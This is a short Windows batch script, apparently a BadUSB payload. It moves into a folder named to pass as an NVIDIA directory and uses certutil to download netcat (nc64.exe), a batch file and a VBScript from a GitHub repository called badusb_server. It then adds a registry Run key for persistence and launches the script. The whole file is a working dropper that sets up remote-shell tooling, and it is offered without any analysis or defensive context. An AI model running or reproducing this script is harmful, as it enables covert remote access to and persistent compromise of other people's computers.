cd "c:\ProgramData\NVIDIA DATE"
certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/nc64.exe
certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/nc.bat
certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "C:\ProgramData\NVIDIA DATE\shut.vbs" /d "c:\windows\system32\regedit" /f
"c:\ProgramData\NVIDIA DATE\shut.vbs"
 pause